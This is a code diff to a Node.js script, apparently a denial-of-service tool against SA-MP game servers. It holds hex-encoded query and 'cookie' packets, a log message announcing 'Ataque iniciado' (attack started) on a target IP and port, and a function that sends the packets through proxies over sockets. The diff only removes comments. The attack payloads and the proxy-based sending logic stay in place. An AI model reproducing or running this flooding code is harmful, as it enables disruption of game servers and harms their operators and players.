@@ -15,16 +15,16 @@ const orgip = ip;
 
 // ข้อมูลแพ็กเก็ตในรูปแบบ Hexadecimal
 const packets = [
-    Buffer.from('53414d5090d91d4d611e700a465b00', 'hex'), // p
-    Buffer.from('53414d509538e1a9611e63', 'hex'), // c
-    Buffer.from('53414d509538e1a9611e69', 'hex'), // i
-    Buffer.from('53414d509538e1a9611e72', 'hex'), // r
-    Buffer.from('081e62da', 'hex'), // cookie port 7796
-    Buffer.from('081e77da', 'hex'), // cookie port 7777
-    Buffer.from('081e4dda', 'hex'), // cookie port 7771
-    Buffer.from('021efd40', 'hex'), // cookie port 7784
-    Buffer.from('021efd40', 'hex'), // cookie port 1111 
-    Buffer.from('081e7eda', 'hex')  // cookie port 1111 tambem
+    Buffer.from('53414d5090d91d4d611e700a465b00', 'hex'),
+    Buffer.from('53414d509538e1a9611e63', 'hex'),
+    Buffer.from('53414d509538e1a9611e69', 'hex'),
+    Buffer.from('53414d509538e1a9611e72', 'hex'),
+    Buffer.from('081e62da', 'hex'),
+    Buffer.from('081e77da', 'hex'),
+    Buffer.from('081e4dda', 'hex'),
+    Buffer.from('021efd40', 'hex'),
+    Buffer.from('021efd40', 'hex'),
+    Buffer.from('081e7eda', 'hex')
 ];
 
 console.log(`Ataque iniciado no ip: ${orgip} e Porta: ${port}`);
@@ -62,7 +62,7 @@ async function sendPackets(proxy) {
                     socket.write(packets[9]);
                 }
             }
-            socket.end(); // ปิดการเชื่อมต่อทันทีหลังจากส่งแพ็กเก็ตเสร็จ
+            socket.end();
         });
 
         socket.on('error', (err) => {
